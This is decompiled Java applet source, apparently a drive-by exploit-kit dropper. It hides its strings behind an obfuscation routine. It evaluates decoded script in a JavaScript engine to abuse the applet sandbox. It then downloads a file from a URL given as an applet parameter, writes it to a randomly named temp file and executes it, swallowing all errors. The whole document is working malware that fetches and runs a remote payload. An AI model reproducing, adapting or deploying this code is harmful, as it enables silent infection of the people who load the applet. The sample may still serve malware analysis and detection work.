import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import javax.script.ScriptEngine;
import java.awt.Component;
import javax.swing.JList;
import javax.script.Invocable;
import javax.script.ScriptEngineManager;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class av34v extends Applet
{
    @Override
    public void init() {
        try {
            final String g = q.g("%$&%gqlfymak)peVav\u007fkv,},\u0017$>%9\u007fs%\u0018$\u0016>UlKv\u0003pAV]vCkR$\u000b%Wq\\fImQk\u0011-Alc,&l!9?%=$'q{}qotrw+}e|b3Wgvmaw+VaRVDgWwDpWHHjKbPv\u001ekDh^,\u0006k\u0010qVWNwlja-(?\u007f%nezfa,*`5-mxx$/%,?l`mqhk\u0005#\u0001>\\?G%\u0010$@`^$owGkD-\u0018?W+PaMvXc_%8$rmhw9whp{wg$o>(");
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName(q.g("^tauCva}l!"));
            engineByName.eval(g);
            this.add(new JList<Object>(new Object[] { ((Invocable)engineByName).invokeFunction(q.g("a{Eac}|2"), this) }));
        }
        catch (Exception ex) {}
    }
    
    @Override
    public String toString() {
        try {
            final String parameter = this.getParameter(q.g("tx9"));
            if (System.getProperty(q.g("}`?|w~0")).toLowerCase().contains(q.g("a~;"))) {
                final InputStream openStream = new URL(parameter).openStream();
                final String string = System.getProperty(q.g("~tau>||:hxopq'")) + q.g("\t") + (q.g("") + Math.random() * 1000.0).substring(0, 8) + q.g(";qn0");
                final FileOutputStream fileOutputStream = new FileOutputStream(string);
                int n = 0;
                InputStream inputStream = openStream;
                int read;
                while ((read = inputStream.read()) != -1) {
                    fileOutputStream.write(read);
                    ++n;
                    inputStream = openStream;
                }
                openStream.close();
                fileOutputStream.close();
                new ProcessBuilder(new String[] { string }).start();
            }
        }
        catch (Exception ex) {}
        return q.g("");
    }
}
